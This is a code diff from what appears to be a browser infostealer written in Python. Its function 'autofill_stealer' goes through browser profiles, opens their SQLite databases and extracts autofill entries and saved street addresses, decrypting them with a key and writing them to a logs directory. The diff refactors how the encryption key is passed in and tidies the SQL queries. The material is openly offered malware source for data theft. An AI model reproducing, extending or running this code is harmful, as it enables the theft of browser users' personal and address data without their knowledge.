@@ -1,11 +1,7 @@
 """ IMPORTS """
 import json
 import sqlite3
-import pywintypes
-from util import (
-    get_profiles, create_temp_file, create_log_file,
-    get_encryption_key, try_decrypt,
-)
+from util import get_profiles, create_temp_file, create_log_file, try_decrypt
 
 
 """
@@ -27,8 +23,8 @@ Tables of interest from SQLi Recon:
 """
 
 
-def autofill_stealer(browser: dict) -> None:
-    """ Steals autofill details from a browser and places them into the logs directory """
+def autofill_stealer(browser: dict, encryption_key: str) -> None:
+    """ Steals autofill data from a browser and places them into the logs directory """
     # Examine each profile
     profile_names = get_profiles(browser['path'])
     for profile_name in profile_names:
@@ -38,9 +34,6 @@ def autofill_stealer(browser: dict) -> None:
         # Access sqlite3 database
         db_connection = sqlite3.connect(db_path)
         cursor = db_connection.cursor()
-
-        # Get encryption key
-        encryption_key = get_encryption_key(browser['path'])
 
         # Extract autofill data from multiple tables
         extract_autofill(browser['name'], profile_name, encryption_key, cursor)
@@ -62,7 +55,7 @@ def autofill_stealer(browser: dict) -> None:
 def extract_autofill(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill table and places them into the logs directory """
     # Query data
-    db_cursor.execute('SELECT name, value from autofill')
+    db_cursor.execute('SELECT name, value FROM autofill')
 
     # Process data
     data = [
@@ -109,7 +102,7 @@ def extract_autofill_profiles(browser_name: str, profile_name: str, encryption_k
 def extract_autofill_addresses(browser_name: str, profile_name: str, encryption_key: str, db_cursor) -> None:
     """ Extracts data from the autofill_profile_addresses table and places them into the logs directory """
     # Query data
-    query = 'SELECT street_address, city, state, zip_code, country_code from autofill_profile_addresses'
+    query = 'SELECT street_address, city, state, zip_code, country_code FROM autofill_profile_addresses'
     db_cursor.execute(query)
 
     # Process data
